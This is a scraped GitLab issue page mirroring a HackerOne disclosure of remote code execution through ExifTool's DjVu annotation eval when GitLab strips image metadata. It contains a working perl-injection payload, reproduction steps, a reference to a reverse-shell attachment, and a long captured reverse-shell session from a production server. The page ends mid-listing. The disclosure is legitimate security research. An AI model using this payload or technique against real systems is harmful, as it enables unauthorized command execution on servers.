[reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab&quot;,&quot;iid&quot;:327121,&quot;issuableId&quot;:84801598,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2021-04-07T14:06:50+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:278964,&quot;projectPath&quot;:&quot;gitlab&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">RCE when removing metadata with ExifTool</h1>
</div>
<div class="description">
<div class="md"><p data-sourcepos="1:1-1:96" dir="auto"><strong data-sourcepos="1:1-1:70"><a data-sourcepos="1:3-1:68" href="https://hackerone.com/reports/1154542" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #1154542</a></strong> by <code data-sourcepos="1:76-1:80">vakzz</code> on 2021-04-07:</p>&#x000A;<p data-sourcepos="3:1-3:87" dir="auto"><a data-sourcepos="3:1-3:17" href="#report">Report</a> | <a data-sourcepos="3:21-3:47" href="#attachments">Attachments</a> | <a data-sourcepos="3:51-3:87" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<h2 data-sourcepos="5:1-5:9" dir="auto">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<h5 data-sourcepos="7:1-7:16" dir="auto">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h5>&#x000A;<p data-sourcepos="8:1-8:279" dir="auto">When uploading image files, GitLab Workhorse passes any files with the extensions <a data-sourcepos="8:83-8:198" href="https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104">jpg|jpeg|tiff</a> through to <a data-sourcepos="8:211-8:243" href="https://exiftool.org/" rel="nofollow noreferrer noopener" target="_blank">ExifTool</a> to remove any non-whitelisted tags.</p>&#x000A;<p data-sourcepos="10:1-10:244" dir="auto">An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.</p>&#x000A;<p data-sourcepos="12:1-12:288" dir="auto">One of the supported formats is <a data-sourcepos="12:33-12:114" href="https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm" rel="nofollow noreferrer noopener" target="_blank">DjVu</a>. When parsing the DjVu annotation, the <a data-sourcepos="12:155-12:254" href="https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233" rel="nofollow noreferrer noopener" target="_blank">tokens are evaled</a> to "convert C escape sequences".</p>&#x000A;<p data-sourcepos="14:1-14:214" dir="auto">There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="16:1-21:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">(metadata  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">	(Copyright "\  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">" . qx{echo vakzz &gt;/tmp/vakzz} . \  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">" b ") )  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="23:1-23:313" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip"><img data-sourcepos="23:1-23:106" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="echo_vakzz.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970"></a> is an example DjVu file with the above metadata, and <a class="no-attachment-icon" href="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip"><img data-sourcepos="23:161-23:272" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="reverse_shell.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970"></a> is an example that runs a reverse shell.</p>&#x000A;<h5 data-sourcepos="25:1-25:27" dir="auto">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to reproduce</h5>&#x000A;<ol data-sourcepos="26:1-32:0" dir="auto">&#x000A;<li data-sourcepos="26:1-26:133">Download <a class="no-attachment-icon" href="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip"><img data-sourcepos="26:13-26:118" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="echo_vakzz.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970"></a> and unzip it</li>&#x000A;<li data-sourcepos="27:1-27:25">Create a new snippet</li>&#x000A;<li data-sourcepos="28:1-28:50">In the description field, hit "Attach a file"</li>&#x000A;<li data-sourcepos="29:1-29:39">Select and uplaod <code data-sourcepos="29:23-29:36">echo_vakzz.jpg</code>&#x000A;</li>&#x000A;<li data-sourcepos="30:1-32:0">See that the file <code data-sourcepos="30:23-30:32">/tmp/vakzz</code> has been created on the server</li>&#x000A;</ol>&#x000A;<p data-sourcepos="33:1-33:200" dir="auto">Uploading <a class="no-attachment-icon" href="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip"><img data-sourcepos="33:11-33:122" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="reverse_shell.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970"></a> to <a href="https://gitlab.com/-/snippets/new">https://gitlab.com/-/snippets/new</a> resulted in a shell on <code data-sourcepos="33:185-33:198">web-09-sv-gprd</code>:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="35:1-329:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">id  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">uid=500(git) gid=500(git) groups=500(git)  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">hostname -a  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">web-09-sv-gprd  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">ps auxww  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">root         4  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/0:0H]  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">root         6  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [mm_percpu_wq]  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">root         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]  </span>&#x000A;<span id="LC13" class="line" lang="plaintext">root         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]  </span>&#x000A;<span id="LC14" class="line" lang="plaintext">root         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]  </span>&#x000A;<span id="LC15" class="line" lang="plaintext">root        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">root        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">root        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]  </span>&#x000A;<span id="LC18" class="line" lang="plaintext">root        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">root        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">root        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">root        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">root        18  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/1:0H]  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">root        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">root        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">root        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">root        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">root        24  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/2:0H]  </span>&#x000A;<span id="LC28" class="line" lang="plaintext">root        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]  </span>&#x000A;<span id="LC29" class="line" lang="plaintext">root        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]  </span>&#x000A;<span id="LC30" class="line" lang="plaintext">root        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">root        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">root        30  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/3:0H]  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">root        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]  </span>&#x000A;<span id="LC34" class="line" lang="plaintext">root        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]  </span>&#x000A;<span id="LC35" class="line" lang="plaintext">root        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]  </span>&#x000A;<span id="LC36" class="line" lang="plaintext">root        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]  </span>&#x000A;<span id="LC37" class="line" lang="plaintext">root        36  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/4:0H]  </span>&#x000A;<span id="LC38" class="line" lang="plaintext">root        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]  </span>&#x000A;<span id="LC39" class="line" lang="plaintext">root        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]  </span>&#x000A;<span id="LC40" class="line" lang="plaintext">root        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]  </span>&#x000A;<span id="LC41" class="line" lang="plaintext">root        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]  </span>&#x000A;<span id="LC42" class="line" lang="plaintext">root        42  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/5:0H]  </span>&#x000A;<span id="LC43" class="line" lang="plaintext">root        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]  </span>&#x000A;<span id="LC44" class="line" lang="plaintext">root        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]  </span>&#x000A;<span id="LC45" class="line" lang="plaintext">root        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]  </span>&#x000A;<span id="LC46" class="line" lang="plaintext">root        46  0.0  0.0      0     0 ?        S     2020  16:33 [ksoftirqd/6]  </span>&#x000A;<span id="LC47" class="line" lang="plaintext">root        48  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/6:0H]  </span>&#x000A;<span id="LC48" class="line" lang="plaintext">root        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]  </span>&#x000A;<span id="LC49" class="line" lang="plaintext">root        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]  </span>&#x000A;<span id="LC50" class="line" lang="plaintext">root        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]  </span>&#x000A;<span id="LC51" class="line" lang="plaintext">root        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]  </span>&#x000A;<span id="LC52" class="line" lang="plaintext">root        54  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/7:0H]  </span>&#x000A;<span id="LC53" class="line" lang="plaintext">root        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]  </span>&#x000A;<span id="LC54" class="line" lang="plaintext">root        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]  </span>&#x000A;<span id="LC55" class="line" lang="plaintext">root        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]  </span>&#x000A;<span id="LC56" class="line" lang="plaintext">root        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]  </span>&#x000A;<span id="LC57" class="line" lang="plaintext">root        60  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/8:0H]  </span>&#x000A;<span id="LC58" class="line" lang="plaintext">root        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]  </span>&#x000A;<span id="LC59" class="line" lang="plaintext">root        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]  </span>&#x000A;<span id="LC60" class="line" lang="plaintext">root        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]  </span>&#x000A;<span id="LC61" class="line" lang="plaintext">root        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]  </span>&#x000A;<span id="LC62" class="line" lang="plaintext">root        66  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/9:0H]  </span>&#x000A;<span id="LC63" class="line" lang="plaintext">root        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]  </span>&#x000A;<span id="LC64" class="line" lang="plaintext">root        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]  </span>&#x000A;<span id="LC65" class="line" lang="plaintext">root        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]  </span>&#x000A;<span id="LC66" class="line" lang="plaintext">root        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]  </span>&#x000A;<span id="LC67" class="line" lang="plaintext">root        72  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/10:0H]  </span>&#x000A;<span id="LC68" class="line" lang="plaintext">root        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]  </span>&#x000A;<span id="LC69" class="line" lang="plaintext">root        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]  </span>&#x000A;<span id="LC70" class="line" lang="plaintext">root        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]  </span>&#x000A;<span id="LC71" class="line" lang="plaintext">root        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]  </span>&#x000A;<span id="LC72" class="line" lang="plaintext">root        78  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/11:0H]  </span>&#x000A;<span id="LC73" class="line" lang="plaintext">root        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]  </span>&#x000A;<span id="LC74" class="line" lang="plaintext">root        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]  </span>&#x000A;<span id="LC75" class="line" lang="plaintext">root        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]  </span>&#x000A;<span id="LC76" class="line" lang="plaintext">root        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]  </span>&#x000A;<span id="LC77" class="line" lang="plaintext">root        84  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/12:0H]  </span>&#x000A;<span id="LC78" class="line" lang="plaintext">root        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]  </span>&#x000A;<span id="LC79" class="line" lang="plaintext">root        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]  </span>&#x000A;<span id="LC80" class="line" lang="plaintext">root        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]  </span>&#x000A;<span id="LC81" class="line" lang="plaintext">root        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]  </span>&#x000A;<span id="LC82" class="line" lang="plaintext">root        90  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/13:0H]  </span>&#x000A;<span id="LC83" class="line" lang="plaintext">root        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]  </span>&#x000A;<span id="LC84" class="line" lang="plaintext">root        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]  </span>&#x000A;<span id="LC85" class="line" lang="plaintext">root        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]  </span>&#x000A;<span id="LC86" class="line" lang="plaintext">root        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoftirqd/14]  </span>&#x000A;<span id="LC87" class="line" lang="plaintext">root        96  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/14:0H]  </span>&#x000A;<span id="LC88" class="line" lang="plaintext">root        97  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/15]  </span>&#x000A;<span id="LC89" class="line" lang="plaintext">root        98  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/15]  </span>&#x000A;<span id="LC90" class="line" lang="plaintext">root        99  0.0  0.0      0     0 ?        S     2020   1:07 [migration/15]  </span>&#x000A;<span id="LC91" class="line" lang="plaintext">root       100  0.0  0.0      0     0 ?        S     2020  16:35 [ksoftirqd/15]  </span>&#x000A;<span id="LC92" class="line" lang="plaintext">root       102  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/15:0H]  </span>&#x000A;<span id="LC93" class="line" lang="plaintext">root       103  0.0  0.0      0     0 ?        S     2020   0:00 [kdevtmpfs]  </span>&#x000A;<span id="LC94" class="line" lang="plaintext">root       104  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [netns]  </span>&#x000A;<span id="LC95" class="line" lang="plaintext">root       105  0.0  0.0      0     0 ?        S     2020   0:00 [rcu_tasks_kthre]  </span>&#x000A;<span id="LC96" class="line" lang="plaintext">root       106  0.0  0.0      0     0 ?        S     2020   0:00 [kauditd]  </span>&#x000A;<span id="LC97" class="line" lang="plaintext">root       110  0.0  0.0      0     0 ?        S     2020   0:33 [khungtaskd]  </span>&#x000A;<span id="LC98" class="line" lang="plaintext">root       111  0.0  0.0      0     0 ?        S     2020   0:11 [oom_reaper]  </span>&#x000A;<span id="LC99" class="line" lang="plaintext">root       112  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [writeback]  </span>&#x000A;<span id="LC100" class="line" lang="plaintext">root       113  0.0  0.0      0     0 ?        S     2020   0:51 [kcompactd0]  </span>&#x000A;<span id="LC101" class="line" lang="plaintext">root       114  0.0  0.0      0     0 ?        SN    2020   0:00 [ksmd]  </span>&#x000A;<span id="LC102" class="line" lang="plaintext">root       115  0.0  0.0      0     0 ?        SN    2020   3:10 [khugepaged]  </span>&#x000A;<span id="LC103" class="line" lang="plaintext">root       116  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [crypto]  </span>&#x000A;<span id="LC104" class="line" lang="plaintext">root       117  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kintegrityd]  </span>&#x000A;<span id="LC105" class="line" lang="plaintext">root       118  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kblockd]  </span>&#x000A;<span id="LC106" class="line" lang="plaintext">root       119  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ata_sff]  </span>&#x000A;<span id="LC107" class="line" lang="plaintext">root       120  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [md]  </span>&#x000A;<span id="LC108" class="line" lang="plaintext">root       121  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [edac-poller]  </span>&#x000A;<span id="LC109" class="line" lang="plaintext">root       122  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [devfreq_wq]  </span>&#x000A;<span id="LC110" class="line" lang="plaintext">root       123  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [watchdogd]  </span>&#x000A;<span id="LC111" class="line" lang="plaintext">root       127  0.0  0.0      0     0 ?        S     2020  76:51 [kswapd0]  </span>&#x000A;<span id="LC112" class="line" lang="plaintext">root       128  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kworker/u33:0]  </span>&#x000A;<span id="LC113" class="line" lang="plaintext">root       129  0.0  0.0      0     0 ?        S     2020   0:00 [ecryptfs-kthrea]  </span>&#x000A;<span id="LC114" class="line" lang="plaintext">root       172  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kthrotld]  </span>&#x000A;<span id="LC115" class="line" lang="plaintext">root       173  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [acpi_thermal_pm]  </span>&#x000A;<span id="LC116" class="line" lang="plaintext">root       174  0.0  0.0      0     0 ?        S     2020   0:00 [scsi_eh_0]  </span>&#x000A;<span id="LC117" class="line" lang="plaintext">root       175  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [scsi_tmf_0]  </span>&#x000A;<span id="LC118" class="line" lang="plaintext">root       183  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ipv6_addrconf]  </span>&#x000A;<span id="LC119" class="line" lang="plaintext">root       195  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [kstrp]  </span>&#x000A;<span id="LC120" class="line" lang="plaintext">root       212  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [charger_manager]  </span>&#x000A;<span id="LC121" class="line" lang="plaintext">root       406  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [raid5wq]  </span>&#x000A;<span id="LC122" class="line" lang="plaintext">root       454  0.0  0.0      0     0 ?        S     2020  10:42 [jbd2/sda1-8]  </span>&#x000A;<span id="LC123" class="line" lang="plaintext">root       455  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ext4-rsv-conver]  </span>&#x000A;<span id="LC124" class="line" lang="plaintext">root       515  0.0  0.0      0     0 ?        I&lt;    2020  11:09 [kworker/12:1H]  </span>&#x000A;<span id="LC125" class="line" lang="plaintext">root       522  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [iscsi_eh]  </span>&#x000A;<span id="LC126" class="line" lang="plaintext">root       525  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ib-comp-wq]  </span>&#x000A;<span id="LC127" class="line" lang="plaintext">root       526  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ib-comp-unb-wq]  </span>&#x000A;<span id="LC128" class="line" lang="plaintext">root       527  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ib_mcast]  </span>&#x000A;<span id="LC129" class="line" lang="plaintext">root       528  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ib_nl_sa_wq]  </span>&#x000A;<span id="LC130" class="line" lang="plaintext">root       531  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [rdma_cm]  </span>&#x000A;<span id="LC131" class="line" lang="plaintext">root       542  0.0  0.0      0     0 ?        I&lt;    2020  10:56 [kworker/6:1H]  </span>&#x000A;<span id="LC132" class="line" lang="plaintext">root       549  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [rpciod]  </span>&#x000A;<span id="LC133" class="line" lang="plaintext">root       550  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [xprtiod]  </span>&#x000A;<span id="LC134" class="line" lang="plaintext">root       565  0.0  0.0 102968   824 ?        Ss    2020   0:00 /sbin/lvmetad -f  </span>&#x000A;<span id="LC135" class="line" lang="plaintext">root       595  0.0  0.0  42604  3368 ?        Ss    2020   2:12 /lib/systemd/systemd-udevd  </span>&#x000A;<span id="LC136" class="line" lang="plaintext">root       596  0.0  0.0  12204  4680 ?        Ss    2020 451:18 /usr/sbin/haveged --Foreground --verbose=1 -w 1024  </span>&#x000A;<span id="LC137" class="line" lang="plaintext">root       597  0.0  0.0  97900 38924 ?        Ss    2020 113:30 /lib/systemd/systemd-journald  </span>&#x000A;<span id="LC138" class="line" lang="plaintext">root       763  0.0  0.0      0     0 ?        S     2020   0:00 [hwrng]  </span>&#x000A;<span id="LC139" class="line" lang="plaintext">root       798  0.0  0.0      0     0 ?        I&lt;    2020   1:33 [kworker/13:1H]  </span>&#x000A;<span id="LC140" class="line" lang="plaintext">root       814  0.0  0.0      0     0 ?        S     2020  12:32 [jbd2/sdb-8]  </span>&#x000A;<span id="LC141" class="line" lang="plaintext">root       815  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [ext4-rsv-conver]  </span>&#x000A;<span id="LC142" class="line" lang="plaintext">prometh+   969  0.6  0.0 720896 31292 ?        Sl    2020 1997:39 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ 